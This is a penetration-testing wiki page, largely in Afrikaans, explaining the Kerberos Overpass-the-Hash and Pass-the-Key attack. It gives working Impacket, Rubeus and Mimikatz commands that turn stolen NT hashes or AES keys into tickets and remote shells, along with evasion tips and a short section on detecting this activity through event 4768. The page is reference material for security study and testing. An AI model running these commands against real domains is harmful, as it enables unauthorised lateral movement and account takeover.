# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Die **Overpass The Hash/Pass The Key (PTK)**-aanval is ontwerp vir omgewings waar die tradisionele NTLM-protokol beperk is, en Kerberos-verifikasie voorkeur geniet. Hierdie aanval benut die NTLM-hash of AES-sleutels van 'n gebruiker om Kerberos-tickets aan te vra, wat ongemagtigde toegang tot hulpbronne binne 'n netwerk moontlik maak.

Streng gesproke:

- **Over-Pass-the-Hash** beteken gewoonlik om die **NT hash** in 'n Kerberos TGT te omskep via die **RC4-HMAC** Kerberos-sleutel.
- **Pass-the-Key** is die meer generiese weergawe waar jy reeds 'n Kerberos-sleutel soos **AES128/AES256** het en direk 'n TGT daarmee aanvra.

Hierdie verskil maak saak in geharde omgewings: as **RC4 gedeaktiveer** is of nie meer deur die KDC veronderstel word nie, is die **NT hash alleen nie genoeg nie** en benodig jy 'n **AES-sleutel** (of die duidelike teks wagwoord om dit af te lei).

Om hierdie aanval uit te voer, behels die eerste stap om die NTLM-hash of wagwoord van die geteikende gebruiker se rekening te verkry. Sodra hierdie inligting bekom is, kan 'n Ticket Granting Ticket (TGT) vir die rekening verkry word, wat die aanvaller toegang gee tot dienste of masjiene waarvoor die gebruiker magtiging het.

Die proses kan met die volgende opdragte begin word:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Vir scenario's wat AES256 vereis, kan die `-aesKey [AES key]` opsie gebruik word:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` ondersteun ook die aanvra van 'n **service ticket direk deur 'n AS-REQ** met `-service <SPN>`, wat nuttig kan wees wanneer jy 'n ticket vir 'n spesifieke SPN wil hê sonder 'n ekstra TGS-REQ:`
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Verder kan die verkrygde ticket met verskeie tools gebruik word, insluitend `smbexec.py` of `wmiexec.py`, wat die omvang van die aanval verbreed.

Probleme soos _PyAsn1Error_ of _KDC cannot find the name_ word tipies opgelos deur die Impacket library op te dateer of die hostname in plaas van die IP address te gebruik, wat verenigbaarheid met die Kerberos KDC verseker.

'n Alternatiewe command sequence met behulp van Rubeus.exe demonstreer 'n ander aspek van hierdie technique:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Hierdie metode weerspieël die **Pass the Key**-benadering, met ’n fokus op die oorneem en direkte gebruik van die ticket vir verifikasiedoeleindes. In die praktyk:

- `Rubeus asktgt` stuur self die **rou Kerberos AS-REQ/AS-REP** en benodig **nie** adminregte nie, tensy jy ’n ander aanmeldsessie met `/luid` wil teiken of ’n aparte een met `/createnetonly` wil skep.
- `mimikatz sekurlsa::pth` plak credential-material in ’n aanmeldsessie in en **raak dus LSASS aan**, wat gewoonlik plaaslike admin of `SYSTEM` vereis en meer geraas maak vanuit ’n EDR-perspektief.

Voorbeelde met Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Om aan operasionele sekuriteit te voldoen en AES256 te gebruik, kan die volgende opdrag toegepas word:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` is relevant omdat Rubeus-gegenereerde traffic effens verskil van native Windows Kerberos. Let ook daarop dat `/opsec` bedoel is vir **AES256** traffic; om dit met RC4 te gebruik vereis gewoonlik `/force`, wat baie van die punt verloor omdat **RC4 in moderne domains self ’n sterk sein** is.

## Detection notes

Elke TGT request genereer **event `4768`** op die DC. In huidige Windows builds bevat hierdie event meer bruikbare velde as wat ouer writeups noem:

- `TicketEncryptionType` sê vir jou watter enctype gebruik is vir die uitgereikte TGT. Tipiese waardes is `0x17` vir **RC4-HMAC**, `0x11` vir **AES128**, en `0x12` vir **AES256**.
- Bygewerkte events toon ook `SessionKeyEncryptionType`, `PreAuthEncryptionType`, en die client's geadverteerde enctypes, wat help om **regte RC4 dependence** van verwarrende legacy defaults te onderskei.
- Om `0x17` in ’n moderne omgewing te sien is ’n goeie leidraad dat die account, host, of KDC fallback path steeds RC4 toelaat en dus meer vriendelik is vir NT-hash-based Over-Pass-the-Hash.

Microsoft het RC4-by-default gedrag geleidelik verminder sedert die November 2022 Kerberos hardening updates, en die huidige gepubliseerde guidance is om **RC4 as die default veronderstelde enctype vir AD DCs teen die einde van Q2 2026 te verwyder**. Vanuit ’n offensive perspektief beteken dit dat **Pass-the-Key met AES** toenemend die betroubare pad is, terwyl klassieke **NT-hash-only OpTH** meer gereeld sal bly misluk in hardened estates.

Vir meer besonderhede oor Kerberos encryption types en verwante ticketing behaviour, kyk:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Each logon session can only have one active TGT at a time so be careful.

1. Create a new logon session with **`make_token`** from Cobalt Strike.
2. Then, use Rubeus to generate a TGT for the new logon session without affecting the existing one.

You can achieve a similar isolation from Rubeus itself with a sacrificial **logon type 9** session:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Dit voorkom dat die huidige session TGT oorskryf word en is gewoonlik veiliger as om die ticket in jou bestaande logon session in te voer.


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
